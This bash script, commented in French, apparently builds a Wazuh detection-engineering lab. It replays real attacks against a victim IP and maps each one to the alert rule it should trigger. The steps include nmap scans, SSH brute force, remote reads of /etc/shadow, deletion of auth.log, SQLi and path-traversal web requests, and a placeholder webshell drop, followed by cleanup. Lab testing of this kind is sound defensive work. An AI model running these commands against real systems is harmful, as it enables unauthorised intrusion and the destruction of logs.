#!/bin/bash
# =============================================================================
# WAZUH LAB v3 — Générateur d'événements RÉELS (Detection Engineering)
# =============================================================================
# Usage : ./wazuh_attack_lab.sh <IP_VICTIME> [menu|all|1-8] [--cleanup]
# =============================================================================

TARGET="$1"
MODE="${2:-menu}"
CLEANUP_FLAG="$3"

VALID_USER="labtest"
VALID_PASS="labtest"
# ------------------------------------------------------

CORR_LOG="wazuh_lab_correlation_$(date +%Y%m%d_%H%M%S).log"

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ -z "$TARGET" ]; then
    echo -e "${RED}Usage: $0 <IP_VICTIME> [menu|all|1-8] [--cleanup]${NC}"
    exit 1
fi

# ─────────────────────────────────────────────────────────────────────────────
# Vérification des dépendances
# ─────────────────────────────────────────────────────────────────────────────
check_deps() {
    local missing=()
    for tool in sshpass nmap nc curl; do
        command -v "$tool" &>/dev/null || missing+=("$tool")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Outils manquants : ${missing[*]}${NC}"
        echo -e "    Installe avec : sudo apt update && sudo apt install ${missing[*]} -y"
        exit 1
    fi
    if ! command -v hydra &>/dev/null; then
        echo -e "${YELLOW}[i] Hydra absent (optionnel) — le brute force utilisera une boucle SSH simple.${NC}"
    fi
}

log_event() {
    # Log de corrélation : horodatage précis pour retrouver l'événement
    # dans Threat Hunting 
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$CORR_LOG"
}

banner() {
    echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║   WAZUH LAB v3 — Cible : $TARGET"
    echo -e "${BLUE}║   Log de corrélation : $CORR_LOG"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
}

check_target() {
    echo -e "${BLUE}[*] Vérification de la connectivité...${NC}"
    if ping -c 1 -W 2 "$TARGET" &>/dev/null; then
        echo -e "${GREEN}[+] Cible joignable.${NC}\n"
    else
        echo -e "${RED}[!] Cible injoignable. Vérifie l'IP / le réseau.${NC}"
        exit 1
    fi
}

ssh_victim() {
    sshpass -p "$VALID_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "$VALID_USER@$TARGET" "echo '$VALID_PASS' | sudo -S $1" 2>/dev/null
}

# ─────────────────────────────────────────────────────────────────────────────
# 1. RECONNAISSANCE — génère rule 100011 (scan)
# ─────────────────────────────────────────────────────────────────────────────
attack_recon() {
    log_event "DEBUT Reconnaissance (Nmap)"
    echo -e "${RED}[!] 1. Reconnaissance — Scans Nmap réels${NC}"
    nmap -sV -T4 "$TARGET" -oN "${TARGET}_recon_version.txt" 2>/dev/null
    nmap -A -T4 "$TARGET" -oN "${TARGET}_recon_aggressive.txt" 2>/dev/null
    nmap -sU --top-ports 20 "$TARGET" 2>/dev/null
    log_event "FIN Reconnaissance"
    echo -e "${GREEN}[+] Scans terminés.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 2. SSH BRUTE FORCE — génère rule 5716/100010 (échecs, niveau 10)
# ─────────────────────────────────────────────────────────────────────────────
attack_ssh_bruteforce() {
    log_event "DEBUT SSH Brute Force (echecs seuls)"
    echo -e "${RED}[!] 2. SSH Brute Force (échecs d'authentification)${NC}"
    USERS=(root admin test guest)
    PASSWORDS=(123456 password admin toor)

    if command -v hydra &>/dev/null; then
        printf "%s\n" "${USERS[@]}" > /tmp/users.txt
        printf "%s\n" "${PASSWORDS[@]}" > /tmp/passwords.txt
        hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 4 -f "$TARGET" ssh
        rm -f /tmp/users.txt /tmp/passwords.txt
    else
        for u in "${USERS[@]}"; do
            for p in "${PASSWORDS[@]}"; do
                sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$u@$TARGET" exit 2>/dev/null
                sleep 0.2
            done
        done
    fi
    log_event "FIN SSH Brute Force"
    echo -e "${GREEN}[+] Brute force terminé.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 3. POST-EXPLOITATION — génère rule 5901/5902 (useradd/userdel), 5401 (sudo)
# ─────────────────────────────────────────────────────────────────────────────
attack_post_exploitation() {
    log_event "DEBUT Post-exploitation"
    echo -e "${RED}[!] 3. Post-exploitation (compte '$VALID_USER')${NC}"

    echo -e "${YELLOW}    → Création/suppression d'utilisateur suspect...${NC}"
    ssh_victim "useradd -m backdoor_user"
    sleep 1
    ssh_victim "userdel -r backdoor_user"

    echo -e "${YELLOW}    → Lecture de fichier sensible (shadow)...${NC}"
    ssh_victim "cat /etc/shadow > /dev/null"

    log_event "FIN Post-exploitation"
    echo -e "${GREEN}[+] Actions post-exploitation terminées.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 4. WEB ATTACK — génère des logs Apache/Nginx exploitables par des règles web
# ─────────────────────────────────────────────────────────────────────────────
attack_web() {
    log_event "DEBUT Attaques Web"
    echo -e "${RED}[!] 4. Attaques Web (SQLi / LFI / recon)${NC}"
    if ! nc -z -w2 "$TARGET" 80 2>/dev/null; then
        echo -e "${YELLOW}    → Port 80 fermé, étape ignorée.${NC}\n"
        log_event "Web attack ignoree (port 80 ferme)"
        return
    fi

    PATHS=("/?id=1' OR '1'='1" "/admin" "/../../etc/passwd" "/?cmd=cat%20/etc/shadow" "/.env" "/wp-login.php")

    for p in "${PATHS[@]}"; do
        curl -s -o /dev/null -A "Mozilla/5.0 sqlmap/1.7" "http://$TARGET$p"
        sleep 0.2
    done
    log_event "FIN Attaques Web"
    echo -e "${GREEN}[+] Requêtes web suspectes envoyées.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 5. RAFALE DE CONNEXIONS — test de seuils / rate-limiting
# ─────────────────────────────────────────────────────────────────────────────
attack_light_dos() {
    log_event "DEBUT Rafale de connexions"
    echo -e "${RED}[!] 5. Rafale de connexions (test de seuils)${NC}"
    for i in {1..50}; do
        nc -z -w1 "$TARGET" 22 2>/dev/null &
    done
    wait
    log_event "FIN Rafale de connexions"
    echo -e "${GREEN}[+] Rafale terminée.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 6. TRAFIC LÉGITIME — vérifie l'absence de faux positifs
# ─────────────────────────────────────────────────────────────────────────────
attack_legit_traffic() {
    log_event "DEBUT Trafic legitime"
    echo -e "${GREEN}[+] 6. Trafic légitime de fond${NC}"
    for i in {1..5}; do
        ping -c 1 -W 1 "$TARGET" &>/dev/null
        nc -z -w1 "$TARGET" 80 2>/dev/null
    done
    log_event "FIN Trafic legitime"
    echo -e "${GREEN}[+] Trafic légitime généré.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 7. ATTAQUES CRITIQUES — niveau 12 à 15 (règles custom)
#    A. Compromission confirmée  -> rule 100013 (niveau 12)
#    B. Suppression de logs      -> rule 100014 (niveau 12)
#    C. Dépôt de webshell        -> rule 100025 (niveau 15)
# ─────────────────────────────────────────────────────────────────────────────
attack_critical() {
    log_event "DEBUT Attaques critiques (Level 12-15)"
    echo -e "${RED}[!] 7. Attaques Critiques (compte '$VALID_USER')${NC}"

    echo -e "${YELLOW}    → A. Compromission confirmée (6 échecs + succès, meme IP)...${NC}"
    log_event "  A. Brute force + succes -> attend rule 100013"
    for i in {1..6}; do
        sshpass -p "badpassword" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$VALID_USER@$TARGET" exit 2>/dev/null
    done
    sshpass -p "$VALID_PASS" ssh -o StrictHostKeyChecking=no "$VALID_USER@$TARGET" "whoami" > /dev/null 2>&1

    echo -e "${YELLOW}    → B. Suppression réelle de auth.log (defense evasion)...${NC}"
    log_event "  B. rm auth.log -> attend rule 100014"
    ssh_victim "rm -f /var/log/auth.log"
    sleep 2
    # Recréation immédiate pour ne pas casser wazuh-logcollector sur la victime
    ssh_victim "touch /var/log/auth.log"

    echo -e "${YELLOW}    → C. Dépôt de webshell dans /var/www/html/...${NC}"
    log_event "  C. depot backdoor.php -> attend rule 100025"
    ssh_victim "sh -c 'echo \"<?php /* wazuh lab test */ ?>\" > /var/www/html/backdoor.php'"

    log_event "FIN Attaques critiques"
    echo -e "${GREEN}[+] Attaques critiques terminées.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# 8. ROOTKIT — génère rule 521 / 100016 (niveau 12) via une VRAIE signature connue de rootcheck .
#    L'alerte peut mettre jusqu'à la valeur de <frequency> du rootcheck avant de remonter.
# ─────────────────────────────────────────────────────────────────────────────
attack_rootkit() {
    log_event "DEBUT Simulation rootkit"
    echo -e "${RED}[!] 8. Dépôt de fichier signature rootkit connue (Adore Worm)${NC}"
    echo -e "${YELLOW}    → attend rule 100016 (peut prendre plusieurs minutes)...${NC}"
    log_event "  Creation usr/bin/adore -> attend rule 100016 (scan periodique)"
    ssh_victim "touch /usr/bin/adore"
    log_event "FIN Simulation rootkit"
    echo -e "${GREEN}[+] Fichier signature déposé. Patience pour le scan rootcheck.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# CLEANUP — supprime tous les artefacts de test laissés sur la victime
# ─────────────────────────────────────────────────────────────────────────────
cleanup_all() {
    echo -e "${BLUE}[*] Nettoyage des artefacts de test sur la victime...${NC}"
    ssh_victim "rm -f /var/www/html/backdoor.php"
    ssh_victim "rm -f /usr/bin/adore"
    ssh_victim "userdel -r backdoor_user" 2>/dev/null
    echo -e "${GREEN}[+] Nettoyage terminé.${NC}\n"
}

# ─────────────────────────────────────────────────────────────────────────────
# RÉSUMÉ FINAL
# ─────────────────────────────────────────────────────────────────────────────
print_summary() {
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║           RÉSUMÉ — Règles à vérifier dans Threat Hunting  ${NC}"
    echo -e "${YELLOW}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║  rule.id:100010  Brute force SSH          (niveau 10)  ${NC}"
    echo -e "${YELLOW}║  rule.id:100011  Scan de ports            (niveau 8)   ${NC}"
    echo -e "${YELLOW}║  rule.id:100012  Usage sudo                (niveau 7)  ${NC}"
    echo -e "${YELLOW}║  rule.id:100013  Compromission confirmée  (niveau 12)  ${NC}"
    echo -e "${YELLOW}║  rule.id:100014  Suppression logs         (niveau 12)  ${NC}"
    echo -e "${YELLOW}║  rule.id:100016  Rootkit connu            (niveau 12)  ${NC}"
    echo -e "${YELLOW}║  rule.id:100025  Webshell détecté         (niveau 15)  ${NC}"
    echo -e "${YELLOW}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║  Log de corrélation : $CORR_LOG${NC}"
    echo -e "${YELLOW}║  → Compare les horodatages avec le dashboard Wazuh     ${NC}"
    echo -e "${YELLOW}║    (attention au fuseau horaire affiché par Kibana)    ${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════╝${NC}"
}

# ─────────────────────────────────────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────────────────────────────────────
run_menu() {
    banner
    echo "1) Reconnaissance (Nmap)"
    echo "2) SSH Brute Force (échecs)"
    echo "3) Post-exploitation"
    echo "4) Attaques Web"
    echo "5) Rafale de connexions"
    echo "6) Trafic légitime"
    echo -e "${RED}7) Attaques Critiques (niveau 12 à 15)${NC}"
    echo -e "${RED}8) Rootkit (signature connue)${NC}"
    echo "9) Kill chain complète (1→8)"
    echo "c) Cleanup (supprime les artefacts de test)"
    echo "0) Quitter"
    read -p "Choix : " choice
    case "$choice" in
        1) check_target; attack_recon ;;
        2) check_target; attack_ssh_bruteforce ;;
        3) check_target; attack_post_exploitation ;;
        4) check_target; attack_web ;;
        5) check_target; attack_light_dos ;;
        6) check_target; attack_legit_traffic ;;
        7) check_target; attack_critical ;;
        8) check_target; attack_rootkit ;;
        9) check_target; attack_legit_traffic; attack_recon; attack_ssh_bruteforce; \
           attack_post_exploitation; attack_web; attack_light_dos; attack_critical; attack_rootkit ;;
        c) check_target; cleanup_all ;;
        0) exit 0 ;;
        *) echo "Choix invalide" ;;
    esac
    print_summary
}

# ─────────────────────────────────────────────────────────────────────────────
# POINT D'ENTRÉE
# ─────────────────────────────────────────────────────────────────────────────
check_deps

case "$MODE" in
    all)   check_target; attack_legit_traffic; attack_recon; attack_ssh_bruteforce; \
           attack_post_exploitation; attack_web; attack_light_dos; attack_critical; attack_rootkit; print_summary ;;
    1)     check_target; attack_recon; print_summary ;;
    2)     check_target; attack_ssh_bruteforce; print_summary ;;
    3)     check_target; attack_post_exploitation; print_summary ;;
    4)     check_target; attack_web; print_summary ;;
    5)     check_target; attack_light_dos; print_summary ;;
    6)     check_target; attack_legit_traffic; print_summary ;;
    7)     check_target; attack_critical; print_summary ;;
    8)     check_target; attack_rootkit; print_summary ;;
    menu)  run_menu ;;
    *)     echo -e "${RED}Mode inconnu: $MODE${NC}" ;;
esac

if [ "$CLEANUP_FLAG" == "--cleanup" ]; then
    cleanup_all
fi
